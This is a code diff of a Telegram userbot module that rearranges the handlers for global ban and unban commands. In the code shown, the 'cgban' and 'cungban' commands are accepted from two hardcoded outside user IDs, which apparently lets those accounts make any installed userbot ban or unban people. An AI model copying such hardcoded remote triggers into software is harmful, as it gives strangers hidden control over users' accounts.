@@ -13,22 +13,20 @@ __HELP__ = """
 
 @PY.UBOT("gban", sudo=True)
 @PY.TOP_CMD
+async def _(client, message):
+    await global_banned(client, message)
+
 @ubot.on_message(
     filters.command(["cgban"], ".") & filters.user([1948147616, 1819269848]))
 async def _(client, message):
     await global_banned(client, message)
 
-@PY.UBOT("xgban", FILTERS.OWNER)
-async def _(client, message):
-    await global_banned(client, message)
-
-@ubot.on_message(
-    filters.command(["cungban"], ".") & filters.user([1948147616, 1819269848]))
 @PY.UBOT("ungban", sudo=True)
 @PY.TOP_CMD
 async def _(client, message):
     await global_unbanned(client, message)
 
-@PY.UBOT("xungban", FILTERS.OWNER)
+@ubot.on_message(
+    filters.command(["cungban"], ".") & filters.user([1948147616, 1819269848]))
 async def _(client, message):
     await global_unbanned(client, message)
